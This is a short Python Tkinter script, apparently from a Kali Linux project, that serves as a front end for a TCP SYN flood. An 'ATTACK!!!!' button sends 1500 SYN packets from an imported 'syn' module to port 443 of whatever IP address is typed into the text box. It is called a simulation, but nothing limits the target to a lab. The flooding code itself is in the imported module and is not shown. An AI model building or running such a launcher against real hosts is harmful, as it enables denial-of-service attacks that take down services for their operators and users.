# TCP-SYN Flood Attack Simulation GUI

# Modules
import sys
sys.path.insert(0, "/home/kali/Desktop/SYN-Flood-DDoS-Attack/source")

from tkinter import *
import threading
import syn

# Functions
def attack():
    input_ip = textbox.get("1.0", "end-1c")
    ip = str(input_ip)
    port = 443

    thread = threading.Thread(target = syn.send_syn, args = (ip, port, 1500, ))
    thread.start()

# GUI
root = Tk()
root.geometry("200x200")

label = Label(root, text = "foo")
textbox = Text(root, height = 1, width = 10)
button1 = Button(root, text = "ATTACK!!!!", command = attack)
button2 = Button(root, text = "destroy", command = root.destroy)

label.pack()
textbox.place(relx = 0.5, rely = 0.2, anchor = CENTER)
button1.place(relx = 0.5, rely = 0.4, anchor = CENTER)
button2.place(relx = 0.5, rely = 0.6, anchor = CENTER)

root.mainloop()